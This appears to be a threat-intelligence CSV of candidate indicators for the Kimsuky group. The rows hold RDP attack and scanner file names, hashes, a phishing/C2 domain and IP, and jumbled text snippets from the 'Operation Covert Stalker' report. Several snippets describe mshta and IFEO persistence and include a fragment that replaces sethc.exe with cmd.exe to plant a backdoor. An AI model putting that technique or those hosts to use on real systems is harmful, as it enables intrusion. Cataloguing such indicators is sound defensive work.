1.0.0,actor--kimsuky,artifact--sha256:a68a66fc874d3a376de2544201c9f533adc4f8e36b2c6a4980a792bfe41a9333,observation--sha256:09f783b3eb8594cbdcdcf8f095ba95017898a5a8395eb7a57a1a11a2a91d6d82,file-name,RDPAttacker(CVE07082019).exe,RDPAttacker(CVE07082019).exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a68a66fc874d3a376de2544201c9f533adc4f8e36b2c6a4980a792bfe41a9333,observation--sha256:ae86e79b8892f6ff6304abdb53b20bc20f4c0e9504a1dd6add330c516e736b59,file-name,RDPAttacker(CVE07082019).exe,RDPAttacker(CVE07082019).exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c12568d53f14331374fd3e59743c676f3e5444d782276fc81c6c96dc615ced65,observation--sha256:839ed02bf78dc725f9cd67b12a12582dff4a6f1923a28a8e7d800e5fad5a4258,file-name,ROOT.zip,ROOT.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 298}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,- ROOT.zip contains the source code for the APPM security solution that was,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c0687fa4a53b7606c77578eb5497ec6caeb20b2aef7dc4089df82af0a7c38730,observation--sha256:ccd90a6b365988d6e42767eb8c96d3916ce3926438f0124ae3a1cbfd90ef75ff,file-name,RdpA1117.exe,RdpA1117.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c0687fa4a53b7606c77578eb5497ec6caeb20b2aef7dc4089df82af0a7c38730,observation--sha256:7561621f7016b1bc843ffdda13d88402e5ae7c6c16f18bf54c0cddc26d04acf1,file-name,RdpA1117.exe,RdpA1117.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:34c5e9cd9f48c84d9ce7f9c683370a8ace92807800e1b2eedc574992cc29a82d,observation--sha256:c2f3d44bd00f89c656e677872e542de0d2183e377fc7d9c1f052ad47fac5a0ec,file-name,RdpAttack_Ksb04_x64.exe,RdpAttack_Ksb04_x64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:34c5e9cd9f48c84d9ce7f9c683370a8ace92807800e1b2eedc574992cc29a82d,observation--sha256:f0a6d9d173474353a62c65d8323c6fc59d7a5f0bf9da4fbccc200ad057be91c6,file-name,RdpAttack_Ksb04_x64.exe,RdpAttack_Ksb04_x64.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:34c5e9cd9f48c84d9ce7f9c683370a8ace92807800e1b2eedc574992cc29a82d,observation--sha256:8fd327fbe117c29ccb5c9f4300dabe15b5762321f8f335a3aa87f4664925de79,file-name,RdpAttack_Ksb04_x64.exe,RdpAttack_Ksb04_x64.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4193e75e3eaa17189bacba01525559c04251f2770c48e7171c0c9ab4be06ba47,observation--sha256:2d502ba0124086749e73ec22077857f097dcb0d22593110cdb399176d386fb25,file-name,RdpAttack_LA05.exe,RdpAttack_LA05.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4193e75e3eaa17189bacba01525559c04251f2770c48e7171c0c9ab4be06ba47,observation--sha256:4c1fd437e96268851e4be5535a40798239d4d6d306d7b2f4063911e78277df28,file-name,RdpAttack_LA05.exe,RdpAttack_LA05.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:31d51570c13c4376f31e7c5766216dbfe34911686b445b09d494a25dc40f47f8,observation--sha256:b34770bf34dd5d2d0853b6b4838e7b6427856904c3577a8cd5ff12e40eb12604,file-name,RdpAttack_LIUJ_1026.exe,RdpAttack_LIUJ_1026.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:31d51570c13c4376f31e7c5766216dbfe34911686b445b09d494a25dc40f47f8,observation--sha256:7f87575df2022b06f4cbbf4bc1c9147c80bef3fb2531435d4db8260b2565beca,file-name,RdpAttack_LIUJ_1026.exe,RdpAttack_LIUJ_1026.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3770828dd40e26e904555aab26c2f64e7695a9b7a7acf1bf5c9057f5208ee083,observation--sha256:c4727c3b102e2c75b104897d19ebea7da06a87595c805227e4dd0b84f1b8dee3,file-name,RdpAttack_La05_x64.zip,RdpAttack_La05_x64.zip,candidate,2022-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is a history, and malicious URLs with similar patterns are registered for each IP. At first glance, the common characteristics of malicious URLs are navernnail.com URL explanation RdpScan_La05_1226_x64.rar ZOOKAgentSetup.zip 41 (Figure 28) Malicious document execution and C2 communication 61.82.110.60(KR) navernnail.com IP Operation Covert Stalker Report navernnail.com It is very important information in profiling because it can track and identify hacking activities, and is a very importan",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:29b97e0f05968480fba0a8ae9c480d6a19e6bc0e26afa16cb0cba86d4d24bf35,observation--sha256:97fd7c0ecc2650a3b9708964b35e6a102bffa5b37ca139f4adbb4f6495b06399,file-name,RdpAttack_Zooho01.exe,RdpAttack_Zooho01.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Information related to this is described in “(4-3) C2 Management and Operations.” Since it contains information about the file, it can be used as a reference when analyzing the file, and you can check meaningful information in the PDB path. can. For example, in Table 4 below, the string vs15 commonly included in PDB information is used by the Kimsuky organization. r_sethc_x64.ex (Table 3) Comparison of strings in r_sethc_x64.exe with original source It exists within a function that does not work",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:29b97e0f05968480fba0a8ae9c480d6a19e6bc0e26afa16cb0cba86d4d24bf35,observation--sha256:304f68fcac76464f33bb97bc5a8f936f88712065a4767400d8bf1e1c8f77f7fa,file-name,RdpAttack_Zooho01.exe,RdpAttack_Zooho01.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:29b97e0f05968480fba0a8ae9c480d6a19e6bc0e26afa16cb0cba86d4d24bf35,observation--sha256:9879200b17054e5ea4ce36a2a23337e7e5c87211c7775c42be86f77467051fa2,file-name,RdpAttack_Zooho01.exe,RdpAttack_Zooho01.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:29b97e0f05968480fba0a8ae9c480d6a19e6bc0e26afa16cb0cba86d4d24bf35,observation--sha256:49ce58b512fe2b10f9f07506748b878ba48fe4a8ba37c54428880a443ddd50c9,file-name,RdpAttack_Zooho01.exe,RdpAttack_Zooho01.exe,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:29b97e0f05968480fba0a8ae9c480d6a19e6bc0e26afa16cb0cba86d4d24bf35,observation--sha256:74c4619e1e1eb02a42feab19193babe65a87522338cdace98728922e22db058b,file-name,RdpAttack_Zooho01.exe,RdpAttack_Zooho01.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ef3d7cb51c8a272976d45976911b175f98c358a5543a2c5e726469deff2e8ec2,observation--sha256:e02691d46e2782536f7dace622c052ced4e54254022497690991b8666ad3a095,file-name,RdpScan_A01.exe,RdpScan_A01.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ef3d7cb51c8a272976d45976911b175f98c358a5543a2c5e726469deff2e8ec2,observation--sha256:1ecc10c4a322c61499d51905c371bf581c50320c87b87b5a397bbfd16202fc40,file-name,RdpScan_A01.exe,RdpScan_A01.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ec2518778bab98b1365ea686673dc8e1eda001314f5473540d878edc46ac23fe,observation--sha256:598af7e7b3a0955dfc97691debb18f0fa74ecd3430dcc85b830d053e64bbf93e,file-name,RdpScan_Ksb04.exe,RdpScan_Ksb04.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ec2518778bab98b1365ea686673dc8e1eda001314f5473540d878edc46ac23fe,observation--sha256:da46cf912b3f4b03ac4aca744aa4295f8915dba2b0dcbb34875b222d75543373,file-name,RdpScan_Ksb04.exe,RdpScan_Ksb04.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7590fb8c28f11d66cb53fca2d40b9867f372155efe1b43d572c98f84ad5e3058,observation--sha256:9841790a0e2543383b6722e67ffa7a24fe38d30068bef5605a855e7f9afe475d,file-name,RdpScan_Ksb04_x64.exe,RdpScan_Ksb04_x64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7590fb8c28f11d66cb53fca2d40b9867f372155efe1b43d572c98f84ad5e3058,observation--sha256:976426833288ba407c3bef0a9cf93a33e5825ddd76714c1b4cffadf57190fa25,file-name,RdpScan_Ksb04_x64.exe,RdpScan_Ksb04_x64.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4fe6983fa736835286b155acb741dc76ccfae72acfd45bd0f9be6cb3f174d49f,observation--sha256:7c68deb3cd4f78bdb3dc2e0896a41ec55112dce5d76fc2ff38326ba88492d312,file-name,RdpScan_La05_1226_x64.rar,RdpScan_La05_1226_x64.rar,candidate,2022-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is a history, and malicious URLs with similar patterns are registered for each IP. At first glance, the common characteristics of malicious URLs are navernnail.com URL explanation RdpScan_La05_1226_x64.rar ZOOKAgentSetup.zip 41 (Figure 28) Malicious document execution and C2 communication 61.82.110.60(KR) navernnail.com IP Operation Covert Stalker Report navernnail.com It is very important information in profiling because it can track and identify hacking activities, and is a very importan",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ecf27c035dfd5a5d3280e2dc15a83202b893ac6d8e5602303535c6619c3ecbc6,observation--sha256:3361fc40ca212db0a6cd2231e47c39b015cf587adf43fefa7b3ca0d26388e50f,file-name,RdpScan_La_1226.exe,RdpScan_La_1226.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ecf27c035dfd5a5d3280e2dc15a83202b893ac6d8e5602303535c6619c3ecbc6,observation--sha256:7e8bde2d76ab481c8d07a16481a00624a23535ebe39438ffe464a5cca15e7c2f,file-name,RdpScan_La_1226.exe,RdpScan_La_1226.exe,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
